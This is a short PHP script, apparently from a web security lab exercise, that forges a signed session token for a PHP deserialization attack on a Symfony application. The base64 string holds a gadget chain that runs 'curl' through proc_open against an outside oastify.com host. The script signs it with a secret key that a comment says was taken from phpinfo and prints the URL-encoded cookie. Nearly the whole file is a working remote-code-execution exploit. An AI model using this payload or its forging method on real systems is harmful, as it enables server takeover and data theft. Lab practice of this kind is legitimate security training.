<?php

    class User
    {
        public $username = "wiener";
        public $access_token = "yezowmdi8q7svz7k1jgbu5pzwliqtz1u";
    }

    //$serialized_object = base64_encode(serialize(new User()));

    $serialized_object = "Tzo2NDoiU3ltZm9ueVxDb21wb25lbnRcUm91dGluZ1xMb2FkZXJcQ29uZmlndXJhdG9yXEltcG9ydENvbmZpZ3VyYXRvciI6MTp7czo3MjoiAFN5bWZvbnlcQ29tcG9uZW50XFJvdXRpbmdcTG9hZGVyXENvbmZpZ3VyYXRvclxJbXBvcnRDb25maWd1cmF0b3IAcGFyZW50IjtPOjQxOiJTeW1mb255XENvbXBvbmVudFxDYWNoZVxUcmFpdHNcUmVkaXNQcm94eSI6Mjp7czo1NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXFRyYWl0c1xSZWRpc1Byb3h5AGluaXRpYWxpemVyIjtPOjgwOiJTeW1mb255XENvbXBvbmVudFxEZXBlbmRlbmN5SW5qZWN0aW9uXExvYWRlclxDb25maWd1cmF0b3JcSW5zdGFuY2VvZkNvbmZpZ3VyYXRvciI6MTp7czo5OiIAKgBwYXJlbnQiO086NDA6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXFNpbXBsZVxQc3I2Q2FjaGUiOjE6e3M6NDY6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxTaW1wbGVcUHNyNkNhY2hlAHBvb2wiO086NDc6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUGhwQXJyYXlBZGFwdGVyIjoyOntzOjU1OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQaHBBcnJheUFkYXB0ZXIAdmFsdWVzIjthOjE6e3M6NTg6ImN1cmwgaHR0cHM6Ly9yeXR4ZGN0dHl0OG9hc2tyZmNzaG13ZHg3b2RmMTYwdXAub2FzdGlmeS5jb20iO2E6MDp7fX1zOjY0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQaHBBcnJheUFkYXB0ZXIAY3JlYXRlQ2FjaGVJdGVtIjtzOjk6InByb2Nfb3BlbiI7fX19czo0ODoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXFRyYWl0c1xSZWRpc1Byb3h5AHJlZGlzIjtzOjU4OiJjdXJsIGh0dHBzOi8vcnl0eGRjdHR5dDhvYXNrcmZjc2htd2R4N29kZjE2MHVwLm9hc3RpZnkuY29tIjt9fQ==";

    // Esto lo sacamos del /cgi-bin/phpinfo.php
    $secret_key = "i6kqn623a0yl0qwvwhowcvfpn2iienpi";

    $sig_hmac_sha1 = hash_hmac('sha1', $serialized_object, $secret_key);
    
    $payload = '{"token": "'.$serialized_object.'", "sig_hmac_sha1": "'.$sig_hmac_sha1.'"}';

    echo urlencode($payload);

?>